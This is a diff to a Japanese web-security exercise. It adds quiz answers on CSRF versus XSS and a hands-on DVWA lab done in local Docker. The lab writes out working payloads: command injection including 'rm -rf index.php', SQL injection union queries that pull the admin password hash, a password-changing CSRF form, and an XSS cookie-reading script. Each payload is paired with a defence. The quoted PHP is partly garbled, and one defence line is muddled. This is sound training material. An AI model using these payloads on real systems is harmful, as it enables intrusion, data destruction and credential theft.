@@ -205,24 +205,152 @@
 
 ## 課題2 (クイズ)
 ### クイズ1
+Cookie に SameSite 属性を付与することで防ぐことができる脆弱性は XSS と CSRF のどちらか?
 
+（但し、SameSite属性を付与することで脆弱性を完全に防げるわけではない。）
 <details><summary>回答</summary><div>
+CSRF
 
+[CookieのSameSite属性で「防げるCSRF」と「防げないCSRF」](https://blog.motikan2010.com/entry/2019/02/02/Cookie%E3%81%AESameSite%E5%B1%9E%E6%80%A7%E3%81%A7%E3%80%8C%E9%98%B2%E3%81%92%E3%82%8BCSRF%E3%80%8D%E3%81%A8%E3%80%8C%E9%98%B2%E3%81%92%E3%81%AA%E3%81%84CSRF%E3%80%8D)
 </div></details>
 
 ### クイズ2
+悪意のあるユーザーが他のユーザーの資格情報を知らなくても可能な攻撃手法は XSS と CSRF のどちらか？
 
 <details><summary>回答</summary><div>
+CSRF
 
+[クロスサイトリクエストフォージェリ (CSRF) | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA_csrf)
+> メモ: ここでのトリックは、John がユーザーの cookie (またはアクセス資格情報) にアクセスする必要がないことです。ユーザーのブラウザーはこの情報を保存し、関連するサーバーへのすべてのリクエストに自動的に含めます。
 </div></details>
-
-### クイズ3
-
-<details><summary>回答</summary><div>
-
-</div></details>
-
 
 ---
 
 ## 課題3 (実装)
+
+### 環境準備
+```bash
+$ docker pull vulnerables/web-dvwa
+$ docker run --rm -it -p 80:80 vulnerables/web-dvwa
+```
+
+### コマンドインジェクション
+- 攻撃
+  1. 各レベルの確認
+      ``` bash
+      ; cat source/low.php
+
+      ---
+
+      {$cmd}
+      "; } ?>
+      ```
+
+      ``` bash
+      ; cat source/medium.php
+
+      ---
+
+       '',
+      		';'  => '',
+      	);
+
+      	// Remove any of the charactars in the array (blacklist).
+      	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+      	// Determine OS and execute the ping command.
+      	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+      		// Windows
+      		$cmd = shell_exec( 'ping  ' . $target );
+      	}
+      	else {
+      		// *nix
+      		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+      	}
+
+      	// Feedback for the end user
+      	$html .= "
+      {$cmd}
+      ";
+      }
+
+      ?>
+      ```
+
+    2. ファイルの削除
+        ```bash
+        ; rm -rf index.php
+        ```
+
+        出力結果がエラーとなった
+        ```
+        Not Found
+        The requested URL /vulnerabilities/exec/ was not found on this server.
+
+        Apache/2.4.25 (Debian) Server at localhost Port 80
+        ```
+- 防御手段
+  ```
+  特定文字のみ受け付けるようにする
+
+  pingの実行コマンドをshell_exec()で組み立てる
+  ```
+
+### SQL インジェクション
+- 攻撃
+  1. 各テーブルのカラム確認 (passwordカラムの確認)
+      ```sql
+      ' union select table_name,column_name from information_schema.columns where table_schema = 'dvwa'#
+      ```
+  2. adminのパスワード取得
+  ```sql
+  ' union select user, password from dvwa.users where user = 'admin' #
+  ```
+  3. ハッシュをデコード
+- 防御手段
+  ```
+  フロントエンドの入力フォームにValidationを導入する。
+
+  バックエンドのエンドポイントにValidationを導入する。
+
+  バックエンドのSQLコマンドを組み立て箇所でプレースホルダーを使用する。
+  ```
+
+### CSRF
+- 攻撃
+  1. ダミーサイトを作成
+      ```html
+      <form action="http://localhost/vulnerabilities/csrf?" method="GET">
+        New password:<br />
+        <input type="hidden" name="password_new" value="12345"><br />
+        Confirm new password:<br />
+        <input type="hidden" name="password_conf" value="12345"><br />
+        <br />
+        <input type="submit" value="Change" name="Change">
+      </form>
+      ```
+  2. ダミーサイトへアクセスしてボタンクリック
+- 防御手段
+  ```
+  csrf の token を form に含める
+
+  cookie属性にSameSite=Laxを付与する
+  ```
+
+- 参考記事
+  - [DVWAでCSRF](https://qiita.com/KPenguin/items/92e88dfe6a5734dc2532)
+
+### XSS
+- 攻撃
+  1. cookieを表示
+      ```
+      ><script>window.alert(document.cookie)</script>
+
+      ---
+
+      PHPSESSID=s391ihbvkbm74il0ghcgjkbvb4; security=low
+      ```
+- 防御手段
+  ```
+  エスケープ処理
+  ```
